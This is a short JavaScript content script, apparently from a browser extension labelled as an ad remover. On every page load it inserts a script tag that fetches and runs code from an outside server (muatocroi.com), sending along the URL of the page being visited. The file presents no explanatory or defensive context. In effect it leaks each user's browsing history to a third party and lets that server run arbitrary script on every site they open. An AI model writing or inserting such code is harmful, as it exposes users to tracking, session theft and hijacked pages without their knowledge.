///////////////////////
function DOMContentLoadedHandle()
{
	var injectiondiv = document.getElementById('injectiondiv');
	if(injectiondiv == undefined)
	{
		var ele=document.createElement("div");
		ele.setAttribute("id","injectiondiv");

		var script = document.createElement('script');
		script.setAttribute("src","http://muatocroi.com/addition/googlechromeEx/removeads/injecScript.php?url="+encodeURIComponent(window.location));
		ele.appendChild(script);

		var parent=document.getElementsByTagName('html')[0];
        parent.insertBefore(ele,parent.childNodes[0]);
    }
}
document.addEventListener('DOMContentLoaded', DOMContentLoadedHandle, false);
///// Save common css